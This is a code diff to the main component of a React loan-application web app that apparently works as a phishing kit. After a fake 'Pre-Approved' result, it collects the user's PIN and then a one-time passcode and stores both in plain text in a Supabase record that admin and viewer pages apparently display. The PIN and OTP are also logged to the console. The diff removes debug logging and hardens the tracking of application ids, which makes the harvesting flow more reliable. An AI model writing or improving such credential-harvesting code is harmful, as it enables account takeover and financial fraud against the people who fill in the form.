@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect, useRef, useState } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { Header } from './components/Header';
 import { LoanCalculatorScreen } from './components/LoanCalculatorScreen';
@@ -12,6 +12,7 @@ import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
 import { calculateMonthlyPayment } from './utils/calculator';
+import { resolveActiveApplicationId } from './utils/applicationId';
 import { buildApplicationInsertPayload, createApplicationInSupabase, updateApplicationVerificationCodeInSupabase } from './utils/supabaseDirect';
 
 const initialFormData: LoanFormData = {
@@ -37,27 +38,15 @@ export default function App() {
   const [formData, setFormData] = useState<LoanFormData>(initialFormData);
   const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const submittedApplicationIdRef = useRef<string | null>(null);
 
   const handlePinSubmit = async (pin: string) => {
-    const previousApplicationId = submittedApplication?.id ?? null;
+    const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
     const phone = formData.phone;
+    const applicationId = resolveActiveApplicationId(submittedApplication?.id ?? null, submittedApplicationIdRef.current, previousApplicationId ?? '');
 
-    console.log('[DEBUG][APP][PIN_START]', {
-      file: 'src/App.tsx',
-      function: 'handlePinSubmit',
-      operation: 'PIN submit started',
-      applicationId: previousApplicationId,
-      phone,
-      pin,
-      currentScreen: currentStep,
-      navigationTarget: 'otp',
-    });
-
-    if (!submittedApplication?.id) {
-      console.error('[DEBUG][APP][PIN_FAIL]', {
-        file: 'src/App.tsx',
-        function: 'handlePinSubmit',
-        operation: 'missing application id before PIN update',
+    if (!applicationId) {
+      console.error('Missing application id before PIN update', {
         applicationId: previousApplicationId,
         phone,
         pin,
@@ -68,33 +57,13 @@ export default function App() {
 
     const displayValue = `PIN: ${pin}`;
     try {
-      const updatedRow = await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
-      console.log('[DEBUG][APP][PIN_UPDATE_SUCCESS]', {
-        file: 'src/App.tsx',
-        function: 'handlePinSubmit',
-        operation: 'PIN update succeeded',
-        applicationId: submittedApplication.id,
-        phone,
-        pin,
-        updatedRow,
-      });
+      submittedApplicationIdRef.current = applicationId;
+      await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
       setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
       setCurrentStep('otp');
-      console.log('[DEBUG][APP][PIN_NAVIGATE]', {
-        file: 'src/App.tsx',
-        function: 'handlePinSubmit',
-        operation: 'navigated to OTP',
-        applicationId: submittedApplication.id,
-        phone,
-        pin,
-        navigationTarget: 'otp',
-      });
     } catch (error: any) {
-      console.error('[DEBUG][APP][PIN_EXCEPTION]', {
-        file: 'src/App.tsx',
-        function: 'handlePinSubmit',
-        operation: 'PIN update exception',
-        applicationId: submittedApplication.id,
+      console.error('PIN update failed', {
+        applicationId,
         phone,
         pin,
         error,
@@ -105,25 +74,12 @@ export default function App() {
   };
 
   const handleOtpSubmit = async (otp: string) => {
-    const previousApplicationId = submittedApplication?.id ?? null;
+    const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
     const phone = formData.phone;
+    const applicationId = resolveActiveApplicationId(submittedApplication?.id ?? null, submittedApplicationIdRef.current, previousApplicationId ?? '');
 
-    console.log('[DEBUG][APP][OTP_START]', {
-      file: 'src/App.tsx',
-      function: 'handleOtpSubmit',
-      operation: 'OTP submit started',
-      applicationId: previousApplicationId,
-      phone,
-      otp,
-      currentScreen: currentStep,
-      navigationTarget: 'success',
-    });
-
-    if (!submittedApplication?.id) {
-      console.error('[DEBUG][APP][OTP_FAIL]', {
-        file: 'src/App.tsx',
-        function: 'handleOtpSubmit',
-        operation: 'missing application id before OTP update',
+    if (!applicationId) {
+      console.error('Missing application id before OTP update', {
         applicationId: previousApplicationId,
         phone,
         otp,
@@ -132,36 +88,16 @@ export default function App() {
       return;
     }
 
-    const existing = submittedApplication.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
+    const existing = submittedApplication?.verificationCode ? `${submittedApplication.verificationCode} / ` : '';
     const displayValue = `${existing}OTP: ${otp}`;
     try {
-      const updatedRow = await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
-      console.log('[DEBUG][APP][OTP_UPDATE_SUCCESS]', {
-        file: 'src/App.tsx',
-        function: 'handleOtpSubmit',
-        operation: 'OTP update succeeded',
-        applicationId: submittedApplication.id,
-        phone,
-        otp,
-        updatedRow,
-      });
+      submittedApplicationIdRef.current = applicationId;
+      await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
       setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
       setCurrentStep('success');
-      console.log('[DEBUG][APP][OTP_NAVIGATE]', {
-        file: 'src/App.tsx',
-        function: 'handleOtpSubmit',
-        operation: 'navigated to success',
-        applicationId: submittedApplication.id,
-        phone,
-        otp,
-        navigationTarget: 'success',
-      });
     } catch (error: any) {
-      console.error('[DEBUG][APP][OTP_EXCEPTION]', {
-        file: 'src/App.tsx',
-        function: 'handleOtpSubmit',
-        operation: 'OTP update exception',
-        applicationId: submittedApplication.id,
+      console.error('OTP update failed', {
+        applicationId,
         phone,
         otp,
         error,
@@ -209,31 +145,15 @@ export default function App() {
   const handleReset = () => {
     setFormData(initialFormData);
     setSubmittedApplication(null);
+    submittedApplicationIdRef.current = null;
     setCurrentStep('calculator');
   };
 
   const handlePhoneReady = async () => {
-    const previousApplicationId = submittedApplication?.id ?? null;
+    const previousApplicationId = submittedApplication?.id ?? submittedApplicationIdRef.current ?? null;
     const phone = formData.phone;
 
-    console.log('[DEBUG][APP][CREATE_START]', {
-      file: 'src/App.tsx',
-      function: 'handlePhoneReady',
-      operation: 'application creation started',
-      previousApplicationId,
-      phone,
-      currentScreen: currentStep,
-      navigationTarget: 'step3',
-    });
-
-    if (submittedApplication?.id) {
-      console.warn('[DEBUG][APP][CREATE_SKIP]', {
-        file: 'src/App.tsx',
-        function: 'handlePhoneReady',
-        operation: 'application already exists, skipping insert',
-        applicationId: submittedApplication.id,
-        phone,
-      });
+    if (submittedApplication?.id || submittedApplicationIdRef.current) {
       return;
     }
 
@@ -243,29 +163,15 @@ export default function App() {
       monthlyPayment,
     });
 
-    console.log('[DEBUG][APP][CREATE_PAYLOAD]', {
-      file: 'src/App.tsx',
-      function: 'handlePhoneReady',
-      operation: 'create application payload',
-      applicationId: payload.id,
-      phone,
-      payload,
-    });
-
     try {
       const createdRecord = await createApplicationInSupabase(payload);
-      console.log('[DEBUG][APP][CREATE_SUCCESS]', {
-        file: 'src/App.tsx',
-        function: 'handlePhoneReady',
-        operation: 'application insert succeeded',
-        applicationId: createdRecord?.id ?? payload.id,
-        phone,
-        returnedRow: createdRecord,
-      });
+
+      const applicationId = createdRecord?.id ?? payload.id;
+      submittedApplicationIdRef.current = applicationId;
 
       const nextApplication: SubmittedApplication = {
         ...formData,
-        id: createdRecord?.id ?? payload.id,
+        id: applicationId,
         submittedAt: payload.submittedAt,
         monthlyPayment,
         status: 'Pre-Approved',
@@ -273,20 +179,8 @@ export default function App() {
         verificationCode: null,
       };
       setSubmittedApplication(nextApplication);
-      console.log('[DEBUG][APP][STATE_STORED]', {
-        file: 'src/App.tsx',
-        function: 'handlePhoneReady',
-        operation: 'application id stored in state',
-        previousApplicationId,
-        applicationId: nextApplication.id,
-        phone,
-        currentScreen: currentStep,
-      });
     } catch (error: any) {
-      console.error('[DEBUG][APP][CREATE_EXCEPTION]', {
-        file: 'src/App.tsx',
-        function: 'handlePhoneReady',
-        operation: 'application create exception',
+      console.error('Application create failed', {
         applicationId: payload.id,
         phone,
         error,
@@ -300,23 +194,15 @@ export default function App() {
     const previousApplicationId = submittedApplication?.id ?? null;
     const phone = formData.phone;
 
-    console.log('[DEBUG][APP][STEP3_SUBMIT_START]', {
-      file: 'src/App.tsx',
-      function: 'handleSubmitApplication',
-      operation: 'step 3 submit started',
-      previousApplicationId,
-      phone,
-      currentScreen: currentStep,
-      navigationTarget: 'pin',
-    });
-
     setIsSubmitting(true);
     const { monthlyPayment } = calculateMonthlyPayment(formData.loanAmount, formData.loanTermMonths);
 
     try {
+      const applicationId = resolveActiveApplicationId(submittedApplication?.id ?? null, submittedApplicationIdRef.current) ?? `ECO-${Math.floor(100000 + Math.random() * 900000)}`;
+      submittedApplicationIdRef.current = applicationId;
       const fallbackApp: SubmittedApplication = {
         ...formData,
-        id: submittedApplication?.id ?? `ECO-${Math.floor(100000 + Math.random() * 900000)}`,
+        id: applicationId,
         submittedAt: submittedApplication?.submittedAt ?? new Date().toISOString(),
         monthlyPayment,
         status: 'Pre-Approved',
@@ -324,21 +210,8 @@ export default function App() {
         verificationCode: submittedApplication?.verificationCode ?? null,
       };
       setSubmittedApplication(fallbackApp);
-      console.log('[DEBUG][APP][STEP3_SUBMIT_OK]', {
-        file: 'src/App.tsx',
-        function: 'handleSubmitApplication',
-        operation: 'step 3 submit complete',
-        previousApplicationId,
-        applicationId: fallbackApp.id,
-        phone,
-        currentScreen: currentStep,
-        navigationTarget: 'pin',
-      });
     } catch (error: any) {
-      console.error('[DEBUG][APP][STEP3_SUBMIT_EXCEPTION]', {
-        file: 'src/App.tsx',
-        function: 'handleSubmitApplication',
-        operation: 'step 3 submit exception',
+      console.error('Step 3 submit failed', {
         applicationId: previousApplicationId,
         phone,
         error,
@@ -348,14 +221,6 @@ export default function App() {
     } finally {
       setIsSubmitting(false);
       setCurrentStep('pin');
-      console.log('[DEBUG][APP][STEP3_NAVIGATE]', {
-        file: 'src/App.tsx',
-        function: 'handleSubmitApplication',
-        operation: 'navigated to PIN',
-        applicationId: submittedApplication?.id ?? null,
-        phone,
-        currentScreen: 'pin',
-      });
     }
   };
 
@@ -450,7 +315,7 @@ export default function App() {
               {currentStep === 'pin' && (
                 <PinScreen
                   phone={formData.phone}
-                  applicationId={submittedApplication?.id ?? ''}
+                  applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
                   onBack={() => setCurrentStep('step3')}
                   onNext={handlePinSubmit}
                 />
@@ -459,7 +324,7 @@ export default function App() {
               {currentStep === 'otp' && (
                 <OtpScreen
                   phone={formData.phone}
-                  applicationId={submittedApplication?.id ?? ''}
+                  applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
                   verificationDisplay={submittedApplication?.verificationCode ?? ''}
                   onBack={() => setCurrentStep('pin')}
                   onSuccess={handleOtpSubmit}
